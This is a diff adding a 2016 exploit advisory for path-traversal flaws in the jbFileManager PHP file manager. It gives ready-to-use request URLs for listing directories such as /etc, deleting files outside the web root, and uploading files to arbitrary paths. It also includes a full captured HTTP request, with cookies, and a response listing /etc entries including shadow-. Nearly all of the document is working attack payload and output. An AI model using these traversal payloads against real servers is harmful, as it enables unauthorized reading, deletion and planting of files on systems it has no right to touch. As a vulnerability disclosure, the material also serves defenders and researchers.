@@ -1,0 +1,57 @@
+# Exploit Title: jbFileManager - Path Traversal(view/add/delete)
+# Date: 2016-06-15
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/ismiranda/jbFileManager
+# Software Link: https://github.com/ismiranda/jbFileManager/archive/master.zip
+# Version: Latest commit
+# Tested on: Debian [wheezy]
+
+### Vulnerability Code
+
+View dir
+http://127.0.0.1/vul_test/jbFileManager/jbfm/jbfm.php?act=open&path=/../../../../../../../../../etc/
+
+Delete file/dir
+http://127.0.0.1/vul_test/jbFileManager/jbfm/jbfm.php?act=del&file=/../../deltest
+
+Add file/dir
+POST /vul_test/jbFileManager/jbfm/jbfm.php?act=upload&path=/jbfm/../../ HTTP/1.1
+Host: 127.0.0.1
+..snip..
+Content-Type: multipart/form-data; boundary=---------------------------218453159691639901924454468
+Content-Length: 232
+
+-----------------------------218453159691639901924454468
+Content-Disposition: form-data; name="file"; filename="123.txt"
+Content-Type: text/plain
+
+asdfjasldfjaslkfjl
+
+-----------------------------218453159691639901924454468--
+
+### Vulnerability Request/Response  -> View dir
+
+View
+GET /vul_test/jbFileManager/jbfm/jbfm.php?act=open&path=/../../../../../../../../../etc/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1/vul_test/jbFileManager/jbfm/
+Cookie: W2=dgf6v5tn2ea8uitvk98m2tfjl7; PHPSESSID=rk2mj70ukt2489t4hrrsj5mr33; jiathis_rdc=%7B%22http%3A//127.0.0.1/vul_test/KodExplore/index.php%22%3A%220%7C1465950328195%22%7D
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Date: Wed, 15 Jun 2016 08:53:39 GMT
+Server: Apache/2.4.10 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 12955
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+[{"name":"libaudit.conf","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/libaudit.conf","class":"undefined"},{"name":"qemu-ifup","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/qemu-ifup","class":"undefined"},{"name":"rsyslog.conf","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/rsyslog.conf","class":"undefined"},{"name":"smi.conf","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/smi.conf","class":"undefined"},{"name":"inputrc","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/inputrc","class":"undefined"},{"name":"shadow-","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/shadow-","class":"undefined"},{"name":"rpc","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/rpc","class":"undefined"},{"name":"host.conf","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/host.conf","class":"undefined"},{"name":"issue","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/issue","class":"undefined"},{"name":"ltrace.conf","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/ltrace.conf","class":"undefined"},{"name":"subuid","link":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/\/subuid","class":"undefined"},
+...snip...
